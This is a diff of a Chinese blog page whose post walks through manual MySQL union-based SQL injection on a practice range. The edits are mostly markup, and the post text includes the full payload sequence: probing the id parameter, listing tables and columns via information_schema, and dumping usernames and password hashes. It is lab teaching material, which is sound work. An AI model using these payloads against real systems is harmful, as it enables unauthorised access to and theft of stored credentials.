@@ -56,7 +56,7 @@
   };
 </script>
 
-  <meta name="keywords" content="个人博客，顾北清">
+  <meta name="keywords" content="安全,Mysql">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Mysql基础注入">
 <meta property="og:url" content="http://yoursite.com/2019/06/14/mysql05/index.html">
@@ -78,7 +78,7 @@
 <meta property="og:image" content="https://image.3001.net/images/20190614/15605157848912.jpg">
 <meta property="og:image" content="https://image.3001.net/images/20190614/15605159017760.jpg">
 <meta property="og:image" content="https://image.3001.net/images/20190614/15605160192900.jpg">
-<meta property="og:updated_time" content="2019-08-21T02:45:38.411Z">
+<meta property="og:updated_time" content="2019-08-22T09:41:50.842Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Mysql基础注入">
 <meta name="twitter:image" content="https://image.3001.net/images/20190614/1560520976146.jpg">
@@ -188,7 +188,7 @@
       
     
 
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签<span class="badge">15</span></a>
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签<span class="badge">16</span></a>
 
   </li>
       
@@ -281,7 +281,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-08-21 10:45:38" itemprop="dateModified" datetime="2019-08-21T10:45:38+08:00">2019-08-21</time>
+                <time title="修改时间：2019-08-22 17:41:50" itemprop="dateModified" datetime="2019-08-22T17:41:50+08:00">2019-08-22</time>
               </span>
             
           
@@ -315,8 +315,8 @@
 <a id="more"></a>
 
 <p><strong>实验环境：墨者学院Mysql手工注入漏洞测试靶场</strong><br>后台源码没有进行任何字符过滤。</p>
-<p>首先进入靶场环境<br><img src="https://image.3001.net/images/20190614/15605103136843.jpg" alt><br>先用<code>admin</code>登陆试试<br><img src="https://image.3001.net/images/20190614/15605162158713.jpg" alt><br>果然不行，这时看到用户登录下方有一个停机维护通知，点进去瞅瞅<br><img src="https://image.3001.net/images/20190614/15605104475821.jpg" alt><br>看到这里链接上有<code>id = 1</code>,怀疑这里会有注入点。</p>
-<p>####判断注入点<br>先简单判断是不是字符型注入点，使用单引号闭合语句,注释后面的语句</p>
+<p>首先进入靶场环境<br><img src="https://image.3001.net/images/20190614/15605103136843.jpg" alt><br>先用<code>admin</code>弱密码登陆试试<br><img src="https://image.3001.net/images/20190614/15605162158713.jpg" alt><br>果然不行，这时看到用户登录下方有一个停机维护通知，点进去瞅瞅<br><img src="https://image.3001.net/images/20190614/15605104475821.jpg" alt><br>看到这里链接上有<code>id = 1</code>,怀疑这里会有注入点。</p>
+<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>先简单判断是不是字符型注入点，使用单引号闭合语句,注释后面的语句</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = 1&apos;--+</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://image.3001.net/images/20190614/15605106681494.jpg" alt><br>发现页面有异常，可能不是字符型，再试试数字型注入</p>
@@ -340,7 +340,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),user(),4</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://image.3001.net/images/20190614/1560515289332.jpg" alt><br>这样我们就成功查询到当前数据库，接着找这个数据库里的数据表。</p>
-<p>####查询数据表<br>补充1：数据库关键库<br>这里需要使用到数据库中一个重要的库<code>information_schema</code>，这个库下面的<code>schemadata</code>表中存放着所有数据库的信息，其中<code>schema_name</code>列中保存着所有数据库名，<code>tables</code>表中存放着所有数据表的信息，其中<code>table_schema</code>列存放着数据库名，<code>table_name</code>列存放着数据表名，<code>columns</code>表中存放着所有数据表的所有列信息，其中<code>column_name</code>存放着所有列名，<code>table_name</code>存放着表名。<br>补充2：concat函数的用法</p>
+<h4 id="查询数据表"><a href="#查询数据表" class="headerlink" title="查询数据表"></a>查询数据表</h4><p>补充1：数据库关键库<br>这里需要使用到数据库中一个重要的库<code>information_schema</code>，这个库下面的<code>schemadata</code>表中存放着所有数据库的信息，其中<code>schema_name</code>列中保存着所有数据库名，<code>tables</code>表中存放着所有数据表的信息，其中<code>table_schema</code>列存放着数据库名，<code>table_name</code>列存放着数据表名，<code>columns</code>表中存放着所有数据表的所有列信息，其中<code>column_name</code>存放着所有列名，<code>table_name</code>存放着表名。<br>补充2：concat函数的用法</p>
 <p>1.concat(str1,str2)<br>将多个结果一行返回。如有任何一个参数为NULL ，则返回值为 NULL。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3;</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select concat(1,2,3);</span><br><span class="line">+---------------+</span><br><span class="line">| concat(1,2,3) |</span><br><span class="line">+---------------+</span><br><span class="line">| 123           |</span><br><span class="line">+---------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
 
@@ -351,11 +351,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_name = database()</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://image.3001.net/images/20190614/15605155258786.jpg" alt><br>这样就查询到当前数据库里面有两个数据表，分别为<code>StormGroup_member</code>,<code>notice</code>。</p>
-<p>####查询列名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&apos;StormGroup_member&apos;</span><br></pre></td></tr></table></figure>
+<h4 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&apos;StormGroup_member&apos;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://image.3001.net/images/20190614/15605156481273.jpg" alt><br>查询到有这个表有四个字段<code>id</code>,<code>name</code>,<code>password</code>,<code>status</code>。</p>
-<p>####查询数据<br>根据上面查询到的四个字段查询数据</p>
+<h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><p>根据上面查询到的四个字段查询数据</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,concat_ws(&apos;~&apos;,id,name,password,status),3,4 from StormGroup_member</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://image.3001.net/images/20190614/15605157848912.jpg" alt><br>成功查到账号密码，不过这个密码好像是加密的，先进行解密<br><img src="https://image.3001.net/images/20190614/15605159017760.jpg" alt><br>使用这个账号密码登陆试试<br><img src="https://image.3001.net/images/20190614/15605160192900.jpg" alt><br>最后尴尬的一幕出现了(/哭)。</p>
@@ -408,6 +407,17 @@
       
 
       <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/安全/" rel="tag"><i class="fa fa-tag"></i> 安全</a>
+            
+              <a href="/tags/Mysql/" rel="tag"><i class="fa fa-tag"></i> Mysql</a>
+            
+          </div>
+        
 
         
 
@@ -457,8 +467,17 @@
 
   <aside id="sidebar" class="sidebar">
     <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
 
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -549,7 +568,9 @@
         
           
         
-        <span class="site-state-item-count">15</span>
+          
+        
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">标签</span>
         </a>
       </div>
@@ -598,6 +619,23 @@
 
         </div>
       </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#判断注入点"><span class="nav-number">1.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询数据表"><span class="nav-number">2.</span> <span class="nav-text">查询数据表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询列名"><span class="nav-number">3.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询数据"><span class="nav-number">4.</span> <span class="nav-text">查询数据</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
 
     </div>
   </aside>
